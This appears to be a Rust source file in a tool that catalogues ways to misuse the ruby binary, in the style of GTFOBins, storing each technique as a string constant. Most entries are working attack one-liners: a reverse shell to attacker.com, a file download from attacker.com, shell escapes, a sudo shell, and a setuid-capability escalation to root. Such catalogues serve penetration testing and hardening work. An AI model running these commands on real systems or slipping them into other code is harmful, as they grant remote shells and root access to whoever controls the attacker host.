pub static BIN_NAME: &'static str = "ruby";
pub static SH_CODE: &'static str = r#"
    
    ruby -e 'exec "/bin/sh"'
"#;
pub static RS_DESC: &'static str = "Run `nc -l -p 12345` on the attacker box to receive the shell.";
pub static RS_CODE: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
"#;
pub static FU_DESC: &'static str =
    "Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later.";
pub static FU_CODE: &'static str = r#"
    
    export LPORT=8888
    ruby -run -e httpd . -p $LPORT
"#;
pub static FD_DESC: &'static str = "Fetch a remote file via HTTP GET request.";
pub static FD_CODE: &'static str = r#"
    
    export URL=http://attacker.com/file_to_get
    export LFILE=file_to_save
    ruby -e 'require "open-uri"; download = open(ENV["URL"]); IO.copy_stream(download, ENV["LFILE"])'
"#;
pub static FW_CODE: &'static str = r#"
    
    ruby -e 'File.open("file_to_write", "w+") { |f| f.write("DATA") }'
"#;
pub static FR_CODE: &'static str = r#"
    
    ruby -e 'puts File.read("file_to_read")'
"#;
pub static LL_CODE: &'static str = r#"
    
    ruby -e 'require "fiddle"; Fiddle.dlopen("lib.so")'
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo ruby -e 'exec "/bin/sh"'
"#;
pub static CB_CODE: &'static str = r#"
    
    cp $(which ruby) .
    sudo setcap cap_setuid+ep ruby

    ./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static RS: Code<'static> = Code {
    title: "RS_CODE",
    code: RS_CODE,
    tag: Tag::RS,
};
pub static FU: Code<'static> = Code {
    title: "FU_CODE",
    code: FU_CODE,
    tag: Tag::FU,
};
pub static FD: Code<'static> = Code {
    title: "FD_CODE",
    code: FD_CODE,
    tag: Tag::FD,
};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static LL: Code<'static> = Code {
    title: "LL_CODE",
    code: LL_CODE,
    tag: Tag::LL,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
pub static CB: Code<'static> = Code {
    title: "CB_CODE",
    code: CB_CODE,
    tag: Tag::CB,
};
